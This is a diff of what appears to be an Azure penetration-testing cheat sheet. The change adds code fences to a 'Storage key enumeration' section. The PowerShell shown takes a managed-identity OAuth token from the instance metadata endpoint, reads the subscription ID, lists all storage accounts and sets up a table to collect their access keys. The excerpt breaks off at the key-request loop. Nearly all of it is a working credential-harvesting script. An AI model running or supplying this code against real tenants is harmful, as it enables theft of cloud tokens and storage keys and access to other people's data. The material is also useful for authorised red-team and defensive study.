@@ -365,35 +365,41 @@ Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalCreatedO
 ```
 
 ### Storage key enumeration
+ 
  #---------Get OAuth Token---------#
+ ```
     if ($ArmToken -eq ''){
         $response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
         $content = $response.Content | ConvertFrom-Json
         $ArmToken = $content.access_token
     }
-
+```
     #---------Query MetaData for SubscriptionID---------#
-    if ($subID -eq ''){
+```
+if ($subID -eq ''){
         $response2 = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
         $subID = ($response2.Content | ConvertFrom-Json).compute.subscriptionId
     }
-   
+```  
 
     #---------Get List of Storage Accounts and RGs---------#
-    $responseKeys = Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subID,'/providers/Microsoft.Storage/storageAccounts?api-version=2019-06-01')) -Method GET -Headers @{ Authorization ="Bearer $ArmToken"} -UseBasicParsing
+```
+$responseKeys = Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subID,'/providers/Microsoft.Storage/storageAccounts?api-version=2019-06-01')) -Method GET -Headers @{ Authorization ="Bearer $ArmToken"} -UseBasicParsing
     $storageACCTS = ($responseKeys.Content | ConvertFrom-Json).value
-
+```
 
     # Create data table to house results
+ ```
     $TempTbl = New-Object System.Data.DataTable 
     $TempTbl.Columns.Add("StorageAccount") | Out-Null
     $TempTbl.Columns.Add("Key1") | Out-Null
     $TempTbl.Columns.Add("Key2") | Out-Null
     $TempTbl.Columns.Add("Key1-Permissions") | Out-Null
     $TempTbl.Columns.Add("Key2-Permissions") | Out-Null
-
+```
     #---------Request access keys for all storage accounts---------#
-    $storageACCTS | ForEach-Object {
+```   
+   $storageACCTS | ForEach-Object {
 
         # Do some split magic on the list of Storage accounts
         $accountName = $_.name
